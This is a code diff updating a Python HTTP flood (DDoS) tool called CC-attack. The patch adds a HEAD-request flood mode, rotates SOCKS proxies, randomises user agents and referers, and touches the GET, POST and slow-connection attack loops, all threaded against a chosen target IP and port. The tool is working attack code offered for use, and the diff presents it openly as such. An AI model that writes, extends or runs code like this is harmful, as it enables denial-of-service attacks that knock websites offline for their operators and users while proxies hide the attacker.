@@ -7,7 +7,7 @@
 #                           -- L330n123 #
 #########################################
 '''
-I'm working on Aoyama's update so this project will stop for a while
+Still working on multiprocessing...
 '''
 import requests
 import socket
@@ -18,6 +18,7 @@ import threading
 import sys
 import ssl
 import datetime
+
 #import multiprocessing #i'm working on it
 
 
@@ -42,6 +43,8 @@ Python3 version Beta
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
+
+useragents = []
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -83,10 +86,14 @@ data = ""
 cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 ###################################################
-Intn = random.randint#idk but it looks like can reduce some cpu usage and time.
+Intn = random.randint
 Choice = random.choice
 setsocks = socks.setdefaultproxy
 ###################################################
+def create_useragents(threads):
+	for _ in range(threads):
+		useragents.append(getuseragent())
+
 def getuseragent():
     platform = Choice(['Macintosh', 'Windows', 'X11'])
     if platform == 'Macintosh':
@@ -133,54 +140,86 @@ def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
 	if cookies != "":
 		connection += "Cookies: "+str(cookies)+"\r\n"
-	err = 0
-	if port == 443 :
-		n = "HTTPS"
-	else:
-		n = "CC"
+	accept = Choice(acceptall)
+	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
+	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	switch_ = True
+	proxy = Choice(proxies).strip().split(":")
 	while True:
-		fake_ip = "X-Forwarded-For: "+str(Intn(1,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"\r\n"
-		fake_ip += "Client-IP: "+str(Intn(1,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"."+str(Intn(0,255))+"\r\n"
-		accept = Choice(acceptall)
-		referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
+		while switch_:
+			try:
+				if socks_type == 4:
+					setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				switch_ = False
+			except:
+				proxy = Choice(proxies).strip().split(":")
+		s = socks.socksocket()
+		if brute:
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 		try:
-			proxy = Choice(proxies).strip().split(":")
-			if socks_type == 4:
-				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-			if socks_type == 5:
-				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			if err > 10:
-				print("[!] Target or proxy maybe down| Changing proxy")
-				break
-			s = socks.socksocket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(ip), int(port)))
 			if port == 443:
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
-			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
-					useragent = "User-Agent: " +getuseragent() + "\r\n"
 					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
+					request = get_host + referer + useragent + accept + connection +"\r\n"
+					s.send(str.encode(request))
+				s.close()
+			except:
+				s.close()
+			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+		except:
+			pass
+
+def head(socks_type):#HEAD MODE
+	connection = "Connection: Keep-Alive\r\n"
+	if cookies != "":
+		connection += "Cookies: "+str(cookies)+"\r\n"
+	accept = Choice(acceptall)
+	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
+	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+	switch_ = True
+	proxy = Choice(proxies).strip().split(":")
+	while True:
+		while switch_:
+			try:
+				if socks_type == 4:
+					setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				switch_ = False
+			except:
+				proxy = Choice(proxies).strip().split(":")
+		s = socks.socksocket()
+		if brute:
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+		try:
+			s.connect((str(ip), int(port)))
+			if port == 443:
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
+			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
+			try:
+				for _ in range(multiple):
+					head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					request = head_host + referer + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
 				s.close()
 			except:
 				s.close()
 		except:#dirty fix
-			pass
-			err = err +1
-	cc(socks_type)
+			pass	
 
 def post(socks_type):
 	global data
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
 	refer = "Referer: http://"+ ip + url2 + "\r\n"
-	user_agent = "User-Agent: " + getuseragent() + "\r\n"
+	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = Choice(acceptall)
 	if mode2 != "y":
 		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
@@ -190,39 +229,36 @@ def post(socks_type):
 	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	err = 0
-	if port == 443 :
-		n = "HTTPS"
-	else:
-		n = "CC"
+	switch_ = True
+	roxy = Choice(proxies).strip().split(":")
+
 	while True:
+		while switch_:
+			try:
+				if socks_type == 4:
+					setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+				if socks_type == 5:
+					setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+				switch_ = False
+			except:
+				proxy = Choice(proxies).strip().split(":")
 		try:
-			proxy = Choice(proxies).strip().split(":")
-			if socks_type == 4:
-				setsocks(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-			if socks_type == 5:
-				setsocks(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			if err > 10:
-				print("[!] Target or proxy maybe down| Changing proxy")
-				break
 			s = socks.socksocket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=ip)
-			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
 				s.close()
 			except:
 				s.close()
+			print ("[*] Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
-			pass#dirty fix
-			err = err + 1
-	post(socks_type)
+			pass
 
 socket_list=[]
 def slow(conn,socks_type):
@@ -238,8 +274,7 @@ def slow(conn,socks_type):
 	for _ in range(conn):
 		try:
 			s = socks.socksocket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			s.settimeout(0.6)
+			s.settimeout(1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				ctx = ssl.SSLContext()
@@ -324,7 +359,7 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 			break
 		try:
 			s = socks.socksocket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
 			s.settimeout(ms)#You can change by yourself
 			s.connect((str(ip), int(port)))
 			if port == 443:
@@ -449,12 +484,12 @@ def main():
 	ip = ""
 	port = ""
 	mode = ""
-	print("> Mode: [cc/post/slow/check]")
+	print("> Mode: [cc/post/head/slow/check]")
 	while mode == "" :
 		mode = str(input("> Choose Your Mode (default=cc) :")).strip()
 		if mode == "":
 			mode = "cc"
-		elif(mode != "cc") and (mode != "post")and(mode != "slow" )and(mode !="check"):
+		elif(mode != "cc") and (mode != "post")and (mode != "head")and(mode != "slow" )and(mode !="check"):
 			print("> Plese enter correct mode")
 			mode = ""
 			continue
@@ -548,6 +583,7 @@ def main():
 			thread_num = int(thread_num)
 		except:
 			sys.exit("Error thread number")
+	create_useragents(thread_num)
 	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
@@ -608,13 +644,16 @@ def main():
 				th = threading.Thread(target = post,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
-				#print("Threads "+str(i+1)+" created")
 		elif mode == "cc":
 			for _ in range(thread_num):
 				th = threading.Thread(target = cc,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
-					#print("Threads "+str(i+1)+" created")
+		elif mode == "head":
+			for _ in range(thread_num):
+				th = threading.Thread(target = head,args=(socks_type,))
+				th.setDaemon(True)
+				th.start()
 	try:
 		while True:
 			pass
